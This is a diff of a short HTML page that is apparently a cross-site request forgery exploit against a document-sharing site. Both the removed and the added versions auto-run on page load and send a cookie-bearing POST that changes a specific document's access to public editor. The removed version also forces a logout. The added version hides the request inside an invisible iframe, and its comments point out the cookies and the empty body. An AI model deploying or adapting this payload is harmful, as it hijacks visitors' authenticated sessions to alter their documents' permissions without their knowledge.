@@ -1,31 +1,21 @@
 <!DOCTYPE html>
 <script>
-// Auto-execute on page load - make document public/editor
-fetch('https://textjam.com/api/doc/H16U9PH6/access/public/editor', {
-    method: 'POST',
-    credentials: 'include',
-    mode: 'no-cors',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({})
-});
+// Create iframe from SAME ORIGIN
+const iframe = document.createElement('iframe');
+iframe.style.display = 'none';
+iframe.srcdoc = `
+    <!DOCTYPE html>
+    <script>
+        fetch('https://textjam.com/api/doc/H16U9PH6/access/public/editor', {
+            method: 'POST',
+            credentials: 'include',  // This sends cookies
+            headers: {
+                'Content-Type': 'application/json'
+            }
+            // NO BODY - Content-Length: 0
+        });
+    <\/script>
+`;
 
-// Then logout
-setTimeout(() => {
-    fetch('https://textjam.com/api/auth/logout', {
-        method: 'POST',
-        credentials: 'include',
-        mode: 'no-cors',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({})
-    }).then(() => {
-        window.location.href = 'https://textjam.com/login';
-    });
-}, 500);
+document.body.appendChild(iframe);
 </script>
-
-
-
-
-
